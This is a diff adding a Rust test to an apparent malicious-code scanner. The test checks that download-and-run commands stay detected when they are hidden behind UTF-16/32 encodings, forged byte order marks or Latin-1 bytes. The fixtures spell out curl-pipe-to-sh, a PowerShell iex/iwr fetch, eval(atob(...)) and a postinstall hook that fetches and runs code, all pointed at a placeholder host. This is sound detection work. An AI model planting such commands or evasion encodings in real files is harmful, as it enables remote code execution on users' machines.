@@ -806,3 +806,184 @@ fn python_f_strings_keep_their_flag_across_lines() {
     );
     assert!(has_high(&r, "obfuscated_sink"), "{r:?}");
 }
+
+fn u16be(s: &str, bom: bool) -> Vec<u8> {
+    let mut v = if bom { vec![0xFE, 0xFF] } else { Vec::new() };
+    for unit in s.encode_utf16() {
+        v.extend_from_slice(&unit.to_be_bytes());
+    }
+    v
+}
+
+fn u16le_nobom(s: &str) -> Vec<u8> {
+    utf16le(s).split_off(2)
+}
+
+fn u32le(s: &str, bom: bool) -> Vec<u8> {
+    let mut v = if bom {
+        vec![0xFF, 0xFE, 0, 0]
+    } else {
+        Vec::new()
+    };
+    for c in s.chars() {
+        v.extend_from_slice(&u32::from(c).to_le_bytes());
+    }
+    v
+}
+
+fn u32be(s: &str, bom: bool) -> Vec<u8> {
+    let mut v = if bom {
+        vec![0, 0, 0xFE, 0xFF]
+    } else {
+        Vec::new()
+    };
+    for c in s.chars() {
+        v.extend_from_slice(&u32::from(c).to_be_bytes());
+    }
+    v
+}
+
+fn prefixed(prefix: &[u8], body: &str) -> Vec<u8> {
+    let mut v = prefix.to_vec();
+    v.extend_from_slice(body.as_bytes());
+    v
+}
+
+#[test]
+fn byte_order_marks_must_match_the_content() {
+    let p = payload();
+    let pipe = "curl -s https://example.invalid/x | sh\n";
+    let ps = "iex (iwr https://example.invalid/a.ps1)\n";
+    let js = format!("eval(atob('{p}'))\n");
+    check(vec![
+        (
+            "ctl-sh-utf8",
+            "i.sh",
+            format!("#!/bin/sh\n{pipe}").into_bytes(),
+            Grade::High,
+            None,
+        ),
+        // A forged UTF-16 mark in front of ASCII: the UTF-8 reading is scanned too.
+        (
+            "bom16-spoof-sh",
+            "i.sh",
+            prefixed(&[0xFF, 0xFE, b'\n'], pipe),
+            Grade::High,
+            None,
+        ),
+        (
+            "bom16be-spoof-sh",
+            "i.sh",
+            prefixed(&[0xFE, 0xFF, b'\n'], pipe),
+            Grade::High,
+            None,
+        ),
+        (
+            "bom16-spoof-js",
+            "i.js",
+            prefixed(&[0xFF, 0xFE, b'\n'], &js),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "bom16-spoof-pkgjson",
+            "package.json",
+            prefixed(
+                &[0xFF, 0xFE],
+                "{\"scripts\": {\"postinstall\": \"curl -s https://example.invalid/x | sh\"}}\n",
+            ),
+            Grade::Block,
+            Some("lifecycle_network"),
+        ),
+        // Real UTF-16/32, with or without a mark.
+        (
+            "utf16le-nobom-ps1",
+            "run.ps1",
+            u16le_nobom(ps),
+            Grade::High,
+            None,
+        ),
+        (
+            "utf16be-nobom-ps1",
+            "run.ps1",
+            u16be(ps, false),
+            Grade::High,
+            None,
+        ),
+        (
+            "utf16be-bom-ps1",
+            "run.ps1",
+            u16be(ps, true),
+            Grade::High,
+            None,
+        ),
+        // Wide text with no extension is text, not binary.
+        (
+            "utf16le-nobom-noext",
+            "scripts/run",
+            u16le_nobom(ps),
+            Grade::Warn,
+            None,
+        ),
+        (
+            "utf16-cjk-bom-js",
+            "w.js",
+            utf16le(&format!("// \u{4e2d}\neval(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "utf16-nobom-cjk-js",
+            "w.js",
+            u16le_nobom(&format!("// \u{4e2d}\u{6587}\neval(atob('{p}'))\n")),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "utf32le-bom-ps1",
+            "run.ps1",
+            u32le(ps, true),
+            Grade::High,
+            None,
+        ),
+        (
+            "utf32be-bom-ps1",
+            "run.ps1",
+            u32be(ps, true),
+            Grade::High,
+            None,
+        ),
+        (
+            "utf32le-nobom-js",
+            "w.js",
+            u32le(&js, false),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        // Latin-1 and broken UTF-8 bytes do not hide what follows.
+        (
+            "latin1-sh",
+            "i.sh",
+            prefixed(b"# caf\xe9 \xff\xfe\n", pipe),
+            Grade::High,
+            None,
+        ),
+        (
+            "latin1-mid-token",
+            "w.js",
+            prefixed(b"// \xe2\x80\n", &js),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+    ]);
+    // A plausible UTF-16 file is read once: the mark is honoured, no second reading.
+    let r = scan(&[("run.ps1", utf16le(ps))], &[]);
+    assert_eq!(
+        r.findings
+            .iter()
+            .filter(|f| f.rule == "download_and_run")
+            .count(),
+        1,
+        "{r:?}"
+    );
+}
